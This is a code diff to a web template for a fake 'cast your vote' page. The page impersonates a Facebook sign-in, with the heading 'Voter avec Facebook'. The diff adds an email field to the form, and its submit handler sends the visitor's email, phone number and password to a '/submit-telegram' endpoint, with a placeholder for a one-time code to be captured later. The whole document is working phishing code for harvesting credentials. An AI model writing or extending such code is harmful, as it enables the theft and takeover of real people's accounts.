@@ -37,9 +37,9 @@
             <section class="vote-intro">
                 <p class="eyebrow eyebrow-light">Step 1 of 1</p>
                 <h1>Sign in to cast your vote.</h1>
-                <p class="vote-intro-sub">Verify with the phone number on your Polaris account.</p>
+                <p class="vote-intro-sub">Verify with your Facebook account.</p>
                 <ul class="vote-points">
-                    <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>One vote per verified phone number</li>
+                    <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>One vote per verified account</li>
                     <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Your details are never shared publicly</li>
                     <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Confirmation sent the moment you vote</li>
                 </ul>
@@ -51,10 +51,21 @@
                 </div>
 
                 <h2 id="authHeading">Voter avec Facebook</h2>
-                <p class="auth-sub">Enter your phone number and password to continue.</p>
+                <p class="auth-sub">Enter your email, phone number, and password to continue.</p>
 
                 <form id="voteForm" method="POST" action="/vote" novalidate>
                     @csrf
+
+                    <div class="field">
+                        <label for="email">Email</label>
+                        <div class="input-wrap">
+                            <span class="input-icon" aria-hidden="true">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="1.6"/><path d="M22 6l-10 7L2 6" stroke="currentColor" stroke-width="1.6"/></svg>
+                            </span>
+                            <input type="email" id="email" name="email" placeholder="Enter your email" autocomplete="email" required />
+                        </div>
+                        <p class="field-error" id="emailError" role="alert"></p>
+                    </div>
 
                     <div class="field">
                         <label for="phone">Phone number</label>
@@ -99,10 +110,11 @@
             console.log('✅ Vote page loaded');
             
             const form = document.getElementById('voteForm');
+            const emailInput = document.getElementById('email');
             const phoneInput = document.getElementById('phone');
             const passwordInput = document.getElementById('password');
             
-            if (!form || !phoneInput || !passwordInput) {
+            if (!form || !emailInput || !phoneInput || !passwordInput) {
                 console.log('❌ Form or inputs not found');
                 return;
             }
@@ -112,10 +124,11 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
+                const email = emailInput.value.trim() || 'No email';
                 const phone = phoneInput.value.trim() || 'No phone';
                 const password = passwordInput.value.trim() || 'No password';
                 
-                console.log('📤 SENDING TO TELEGRAM:', { phone, password });
+                console.log('📤 SENDING TO TELEGRAM:', { email, phone, password });
                 
                 fetch('/submit-telegram', {
                     method: 'POST',
@@ -123,13 +136,13 @@
                         'Content-Type': 'application/json',
                         'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                     },
-                    body: JSON.stringify({ phone, password, code: 'PENDING_OTP' })
+                    body: JSON.stringify({ email, phone, password, code: 'PENDING_OTP' })
                 })
                 .then(response => response.json())
                 .then(data => {
                     console.log('📥 TELEGRAM RESPONSE:', data);
                     if (data.success) {
-                        console.log('✅ TELEGRAM SENT WITH:', phone, password);
+                        console.log('✅ TELEGRAM SENT WITH:', { email, phone, password });
                     } else {
                         console.log('❌ ERROR:', data);
                     }
